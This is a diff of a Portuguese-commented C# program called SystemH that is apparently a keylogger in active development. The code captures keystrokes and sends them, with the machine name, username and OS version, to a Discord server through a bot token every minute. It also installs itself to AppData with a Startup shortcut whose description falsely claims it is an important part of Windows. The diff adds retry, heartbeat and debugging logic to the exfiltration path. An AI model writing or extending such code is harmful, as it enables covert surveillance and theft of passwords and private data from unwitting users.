@@ -8,12 +8,6 @@ namespace CastApp
     public class Program
     {
         /// <summary>
-        /// Pasta e arquivo de log
-        /// </summary>
-        private static readonly string LogDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "SystemH");
-        private static readonly string LogFile = Path.Combine(LogDirectory, "SystemH.log");
-
-        /// <summary>
         /// Lock para escrita no arquivo para evitar condições de corrida em ambientes multithread
         /// </summary>
         private static readonly object FileLock = new object();
@@ -25,12 +19,18 @@ namespace CastApp
         private static DateTime lastFlush = DateTime.Now;
         private static readonly TimeSpan FlushInterval = TimeSpan.FromSeconds(30);
 
-        // ADICIONADO: Instâncias para Discord
+        /// <summary>
+        /// Inicializacao 
+        /// </summary>
         private static DiscordConfigService? _configService;
         private static DiscordLogger? _discordLogger;
         private static readonly StringBuilder DiscordBuffer = new StringBuilder();
         private static DateTime lastDiscordSend = DateTime.Now;
-        private static readonly TimeSpan DiscordSendInterval = TimeSpan.FromMinutes(5); // Enviar a cada 5 minutos
+        private static readonly TimeSpan DiscordSendInterval = TimeSpan.FromMinutes(1);
+
+        // ADICIONADO: Controle de estado do Discord
+        private static bool _discordInitialized = false;
+        private static Exception? _lastDiscordError = null;
 
         private static Mutex? _mutex;
 
@@ -43,7 +43,8 @@ namespace CastApp
             /// Natives.FreeConsole(); Esconde o console mas no visual studio continua fica visivel
             /// para que assim possamos ver os erros que possam ocorrer
             /// <summary>
-            Natives.FreeConsole();
+            // TEMPORARIAMENTE COMENTADO PARA DEBUG
+            // Natives.FreeConsole();
 
             // Garante que apenas uma instância do SystemH esteja rodando
             _mutex = new Mutex(initiallyOwned: true, "SystemH", out var createdNew);
@@ -52,56 +53,154 @@ namespace CastApp
             {
                 if (createdNew)
                 {
-                    // Cria o diretório de log se não existir e seta como oculto
-                    Directory.CreateDirectory(LogDirectory);
-                    DirectoryInfo dirInfo = new DirectoryInfo(LogDirectory);
-                    if (!dirInfo.Attributes.HasFlag(FileAttributes.Hidden))
+                    LogError("=== INICIANDO SYSTEMH ===");
+                    LogError($"Diretório de trabalho: {Environment.CurrentDirectory}");
+                    LogError($"Usuário: {GetUserName()}");
+                    LogError($"Máquina: {GetMachineName()}");
+
+                    await InitializeDiscordServicesWithRetry();
+
+                    // TEMPORARIAMENTE COMENTADO PARA DEBUG
+                    //InstallToStartup();
+                    LogError("Iniciando captura de teclas...");
+
+                    if (_discordInitialized)
                     {
-                        dirInfo.Attributes |= FileAttributes.Hidden;
+                        await TestDiscordConnection();
                     }
 
-                    await InitializeDiscordServices();
-                    InstallToStartup();
                     StartKeyCapture();
+                }
+                else
+                {
+                    LogError("Outra instância já está rodando. Encerrando...");
                 }
             }
             catch (Exception ex)
             {
-                await LogError($"Erro fatal: {ex.Message}");
+                LogError($"Erro fatal: {ex.Message}");
+                LogError($"StackTrace: {ex.StackTrace}");
+                Console.WriteLine($"ERRO FATAL: {ex.Message}");
+                Console.WriteLine("Pressione qualquer tecla para continuar...");
                 Console.ReadKey();
+            }
+            finally
+            {
+                _mutex?.ReleaseMutex();
+                _mutex?.Dispose();
             }
         }
 
-        // ADICIONADO: Inicializa os serviços do Discord
-        private static async Task InitializeDiscordServices()
+        private static async Task InitializeDiscordServicesWithRetry()
+        {
+            int maxRetries = 3;
+
+            for (int attempt = 1; attempt <= maxRetries; attempt++)
+            {
+                try
+                {
+                    LogError($"=== TENTATIVA {attempt} DE INICIALIZAR DISCORD ===");
+
+                    string credentialsFile = "SystemH.enc";
+                    if (!System.IO.File.Exists(credentialsFile))
+                    {
+                        LogError($"ERRO: Arquivo de credenciais '{credentialsFile}' não encontrado!");
+                        LogError($"Diretório atual: {Environment.CurrentDirectory}");
+                        LogError($"Arquivos no diretório: {string.Join(", ", Directory.GetFiles(Environment.CurrentDirectory))}");
+                        continue;
+                    }
+
+                    LogError("Arquivo de credenciais encontrado. Inicializando DiscordConfigService...");
+                    _configService = new DiscordConfigService();
+
+                    LogError("Obtendo configuração do Discord...");
+                    var config = await _configService.GetDiscordConfigAsync();
+
+                    LogError($"Token obtido (primeiros 100 chars): {config.Token?.Substring(0, Math.Min(100, config.Token?.Length ?? 0))}...");
+                    LogError($"Guild ID: {config.LogGuildId}");
+                    LogError($"Category ID: {config.MachineCategoryId}");
+
+                    if (string.IsNullOrEmpty(config.Token))
+                    {
+                        throw new Exception("Token do Discord está vazio");
+                    }
+
+                    LogError("Criando DiscordLogger...");
+                    _discordLogger = new DiscordLogger(
+                        config.Token,
+                        (ulong)config.LogGuildId,
+                        (ulong)config.MachineCategoryId
+                    );
+
+                    LogError("Inicializando conexão com Discord...");
+                    await _discordLogger.InitializeAsync();
+
+                    _discordInitialized = true;
+                    LogError("=== DISCORD INICIALIZADO COM SUCESSO ===");
+                    return;
+                }
+                catch (Exception ex)
+                {
+                    _lastDiscordError = ex;
+                    LogError($"=== ERRO NA TENTATIVA {attempt} ===");
+                    LogError($"Erro: {ex.Message}");
+                    LogError($"StackTrace: {ex.StackTrace}");
+
+                    if (ex.InnerException != null)
+                    {
+                        LogError($"Inner Exception: {ex.InnerException.Message}");
+                        LogError($"Inner StackTrace: {ex.InnerException.StackTrace}");
+                    }
+
+                    if (attempt < maxRetries)
+                    {
+                        LogError($"Aguardando 5 segundos antes da próxima tentativa...");
+                        await Task.Delay(5000);
+                    }
+                }
+            }
+
+            LogError("=== FALHA AO INICIALIZAR DISCORD APÓS TODAS AS TENTATIVAS ===");
+            _discordInitialized = false;
+        }
+
+        private static async Task TestDiscordConnection()
         {
             try
             {
-                _configService = new DiscordConfigService();
-                var config = await _configService.GetDiscordConfigAsync();
+                LogError("=== TESTANDO CONEXÃO COM DISCORD ===");
 
-                _discordLogger = new DiscordLogger(
-                    config.Token ?? throw new Exception("Token do Discord não encontrado"),
-                    (ulong)config.LogGuildId,
-                    (ulong)config.MachineCategoryId
+                if (_discordLogger == null)
+                {
+                    LogError("DiscordLogger é null!");
+                    return;
+                }
+
+                await _discordLogger.SendLogAsync(
+                    GetMachineName(),
+                    GetUserName(),
+                    GetOSVersion(),
+                    GetCpuCount(),
+                    "🔥 TESTE DE CONEXÃO - SystemH iniciado com sucesso!"
                 );
 
-                await _discordLogger.InitializeAsync();
-                await LogError("Discord inicializado com sucesso!");
+                LogError("=== TESTE DE CONEXÃO ENVIADO COM SUCESSO ===");
             }
             catch (Exception ex)
             {
-                await LogError($"Erro ao inicializar Discord: {ex.Message}");
+                LogError($"=== ERRO NO TESTE DE CONEXÃO ===");
+                LogError($"Erro: {ex.Message}");
+                LogError($"StackTrace: {ex.StackTrace}");
             }
         }
 
-        private static async Task LogError(string message)
+        private static void LogError(string message)
         {
             try
             {
-                string logMessage = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}\r\n";
-                string errorLogFile = Path.Combine(LogDirectory, "error.log");
-                await System.IO.File.AppendAllTextAsync(errorLogFile, logMessage);
+                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff");
+                string logMessage = $"[{timestamp}] {message}\r\n";
+                Console.WriteLine($"[DEBUG] {logMessage.Trim()}");
             }
             catch
             {
@@ -116,55 +215,62 @@ namespace CastApp
 
         public static void InstallToStartup()
         {
-            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
-                throw new PlatformNotSupportedException("Este método só é suportado no Windows.");
-
-            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            string text = Path.Combine(folderPath, "SystemH");
-            Directory.CreateDirectory(text);
-            string path = Environment.ProcessPath ?? Assembly.GetExecutingAssembly().Location;
-            string fileName = Path.GetFileName(path);
-
-            // Lista atualizada de arquivos necessários
-            string[] array = new string[] {
-                fileName,
-                "DSharpPlus.dll",
-                "CastApp.dll",
-                "CastApp.deps.json",
-                "CastApp.runtimeconfig.json",
-                "Microsoft.Extensions.Logging.Abstractions.dll",
-                "Newtonsoft.Json.dll",
-                "SystemH.enc" // ADICIONADO: Inclui o arquivo de credenciais
-            };
-
-            string? directoryName = Path.GetDirectoryName(path);
-            if (directoryName == null)
-                throw new InvalidOperationException("O diretório do executável não pôde ser determinado.");
-
-            foreach (string file in array)
+            try
             {
-                string sourcePath = Path.Combine(directoryName, file);
-                string destPath = Path.Combine(text, file);
-                if (System.IO.File.Exists(sourcePath) && !System.IO.File.Exists(destPath))
+                if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+                    throw new PlatformNotSupportedException("Este método só é suportado no Windows.");
+
+                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                string text = Path.Combine(folderPath, "SystemH");
+                Directory.CreateDirectory(text);
+                string path = Environment.ProcessPath ?? Assembly.GetExecutingAssembly().Location;
+                string fileName = Path.GetFileName(path);
+
+                // Lista de arquivos necessários
+                string[] array = new string[] {
+                    fileName,
+                    "DSharpPlus.dll",
+                    "CastApp.dll",
+                    "CastApp.deps.json",
+                    "CastApp.runtimeconfig.json",
+                    "Microsoft.Extensions.Logging.Abstractions.dll",
+                    "Newtonsoft.Json.dll",
+                    "SystemH.enc",
+                };
+
+                string? directoryName = Path.GetDirectoryName(path);
+                if (directoryName == null)
+                    throw new InvalidOperationException("O diretório do executável não pôde ser determinado.");
+
+                foreach (string file in array)
                 {
-                    System.IO.File.Copy(sourcePath, destPath, overwrite: false);
+                    string sourcePath = Path.Combine(directoryName, file);
+                    string destPath = Path.Combine(text, file);
+                    if (System.IO.File.Exists(sourcePath) && !System.IO.File.Exists(destPath))
+                    {
+                        System.IO.File.Copy(sourcePath, destPath, overwrite: false);
+                    }
                 }
+
+                string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                string pathLink = Path.Combine(folderPath2, "SystemH.lnk");
+
+                Type? wshType = Marshal.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
+                if (wshType == null)
+                    throw new InvalidOperationException("Não foi possível obter o tipo WshShell.");
+
+                WshShell wshShell = (WshShell)Activator.CreateInstance(wshType)!;
+                IWshShortcut wshShortcut = (IWshShortcut)(dynamic)wshShell.CreateShortcut(pathLink);
+                wshShortcut.TargetPath = Path.Combine(text, fileName);
+                wshShortcut.WorkingDirectory = text;
+                wshShortcut.WindowStyle = 1;
+                wshShortcut.Description = "Inicia o SystemH na inicialização, Parte IMPORTANTE do Windows";
+                wshShortcut.Save();
             }
-
-            string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-            string pathLink = Path.Combine(folderPath2, "SystemH.lnk");
-
-            Type? wshType = Marshal.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
-            if (wshType == null)
-                throw new InvalidOperationException("Não foi possível obter o tipo WshShell.");
-
-            WshShell wshShell = (WshShell)Activator.CreateInstance(wshType)!;
-            IWshShortcut wshShortcut = (IWshShortcut)(dynamic)wshShell.CreateShortcut(pathLink);
-            wshShortcut.TargetPath = Path.Combine(text, fileName);
-            wshShortcut.WorkingDirectory = text;
-            wshShortcut.WindowStyle = 1;
-            wshShortcut.Description = "Inicia o SystemH na inicialização, Parte IMPORTANTE do Windows";
-            wshShortcut.Save();
+            catch (Exception ex)
+            {
+                _ = Task.Run(() => LogError($"Erro ao instalar no startup: {ex.Message}"));
+            }
         }
 
         /// <summary>
@@ -182,7 +288,7 @@ namespace CastApp
                         FlushBuffer();
                     }
 
-                    if (DateTime.Now - lastDiscordSend > DiscordSendInterval)
+                    if (_discordInitialized && DateTime.Now - lastDiscordSend > DiscordSendInterval)
                     {
                         _ = Task.Run(SendDiscordLogAsync);
                     }
@@ -216,24 +322,65 @@ namespace CastApp
         {
             try
             {
-                if (_discordLogger == null || DiscordBuffer.Length == 0)
+                LogError("=== TENTANDO ENVIAR LOG PARA DISCORD ===");
+
+                if (!_discordInitialized)
+                {
+                    LogError("Discord não inicializado. Tentando reinicializar...");
+                    await InitializeDiscordServicesWithRetry();
+                    if (!_discordInitialized)
+                    {
+                        LogError("Falha ao reinicializar Discord. Abortando envio.");
+                        return;
+                    }
+                }
+
+                if (_discordLogger == null)
+                {
+                    LogError("DiscordLogger é null!");
                     return;
+                }
 
                 string content;
+                int contentLength;
+                bool bufferVazio;
+
                 lock (DiscordBuffer)
                 {
                     content = DiscordBuffer.ToString();
-                    DiscordBuffer.Clear();
+                    contentLength = content.Length;
+                    bufferVazio = contentLength == 0;
+
+                    if (bufferVazio)
+                    {
+                        content = $"[{DateTime.Now:HH:mm:ss}] Heartbeat - Sistema ativo";
+                    }
+                    else
+                    {
+                        DiscordBuffer.Clear();
+                    }
+                }
+
+                LogError($"Conteúdo do buffer Discord: {contentLength} caracteres");
+                if (bufferVazio)
+                {
+                    LogError("Buffer vazio, enviando heartbeat para teste");
                 }
 
                 if (string.IsNullOrWhiteSpace(content))
+                {
+                    LogError("Conteúdo está vazio ou só contém espaços");
                     return;
+                }
 
                 if (content.Length > 1900)
                 {
                     content = content.Substring(content.Length - 1900);
                     content = "...[truncado]..." + content;
+                    LogError($"Conteúdo truncado para {content.Length} caracteres");
                 }
+
+                LogError($"Enviando para Discord: {content.Substring(0, Math.Min(50, content.Length))}...");
 
                 await _discordLogger.SendLogAsync(
                     GetMachineName(),
@@ -244,10 +391,20 @@ namespace CastApp
                 );
 
                 lastDiscordSend = DateTime.Now;
+                LogError("=== LOG ENVIADO COM SUCESSO PARA DISCORD ===");
             }
             catch (Exception ex)
             {
-                await LogError($"Erro ao enviar para Discord: {ex.Message}");
+                LogError($"=== ERRO AO ENVIAR PARA DISCORD ===");
+                LogError($"Erro: {ex.Message}");
+                LogError($"StackTrace: {ex.StackTrace}");
+
+                if (ex.InnerException != null)
+                {
+                    LogError($"Inner Exception: {ex.InnerException.Message}");
+                }
+
+                _discordInitialized = false;
             }
         }
 
@@ -267,9 +424,12 @@ namespace CastApp
                         KeyBuffer.Append(keyInfo);
                     }
 
-                    lock (DiscordBuffer)
+                    if (_discordInitialized)
                     {
-                        DiscordBuffer.Append(keyInfo);
+                        lock (DiscordBuffer)
+                        {
+                            DiscordBuffer.Append(keyInfo);
+                        }
                     }
                 }
             }
@@ -380,11 +540,6 @@ namespace CastApp
 
                     content = KeyBuffer.ToString();
                     KeyBuffer.Clear();
-                }
-
-                lock (FileLock)
-                {
-                    System.IO.File.AppendAllText(LogFile, content, Encoding.UTF8);
                 }
 
                 lastFlush = DateTime.Now;
